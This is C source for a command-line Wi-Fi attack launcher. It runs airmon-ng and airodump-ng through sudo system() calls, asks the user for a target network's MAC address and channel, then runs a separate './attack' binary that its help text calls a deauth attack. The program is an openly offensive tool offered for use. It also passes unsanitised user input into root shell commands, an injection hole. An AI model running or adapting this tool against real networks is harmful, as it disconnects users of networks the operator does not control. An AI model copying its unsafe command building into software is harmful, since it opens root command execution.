#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void show_usage() {
  printf("Usage: ./scan -run\n");
  printf("Options:\n");
  printf("  -run     Starts the network scan, allows you to choose a target, "
         "and executes the deauth attack.\n");
  printf("  -Copyright    Made by Mohammad Javad Choopani \n ");
  printf(" -help    Show this help message.\n");
}

int main(int argc, char *argv[]) {
  // Check if any arguments are provided
  if (argc < 2) {
    show_usage();
    return 1;
  }

  // Check if the argument is -run to start the project
  if (strcmp(argv[1], "-run") == 0) {
    const char *iface = "wlan0"; // Replace with your wireless interface name
    char command[256];
    const char *executable =
        "./attack"; // Replace with the path to your executable
    char target_mac[18];
    int channel;

    // Step 1: Enable monitor mode
    snprintf(command, sizeof(command), "sudo airmon-ng start %s", iface);
    printf("Starting monitor mode on %s...\n", iface);
    system(command);

    sleep(3);

    // Step 2: Perform a full network scan
    snprintf(command, sizeof(command),
             "sudo airodump-ng %smon ",
             iface);
    printf("Running full network scan... Press Ctrl+C to stop when ready.\n");
    system(command);

    // Step 3: Get the target MAC address and channel number from the user
    printf("\nEnter the target MAC address (e.g., AA:BB:CC:DD:EE:FF): ");
    scanf("%17s", target_mac);

    printf("Enter the channel number for the target network: ");
    scanf("%d", &channel);

    // Step 4: Perform a targeted scan on the specified MAC address and channel
    snprintf(command, sizeof(command),
             "sudo airodump-ng --bssid %s --channel %d %smon ",
             target_mac, channel, iface);
    printf(
        "Running targeted scan on %s (channel %d)... Press Ctrl+C to stop.\n",
        target_mac, channel);
    system(command);

    // Step 5: Run the executable file
    printf("Targeted scan complete. Running the attack script...\n");
    snprintf(command, sizeof(command), "sudo %s", executable);
    system(command);

    // Step 6: Stop monitor mode
    snprintf(command, sizeof(command), "sudo airmon-ng stop %smon", iface);
    printf("Stopping monitor mode on %smon...\n", iface);
    system(command);

  } else if (strcmp(argv[1], "-help") == 0) {
    // Show usage information if -help is specified
    show_usage();
  } else {
    printf("Unknown option: %s\n", argv[1]);
    show_usage();
    return 1;
  }

  return 0;
}
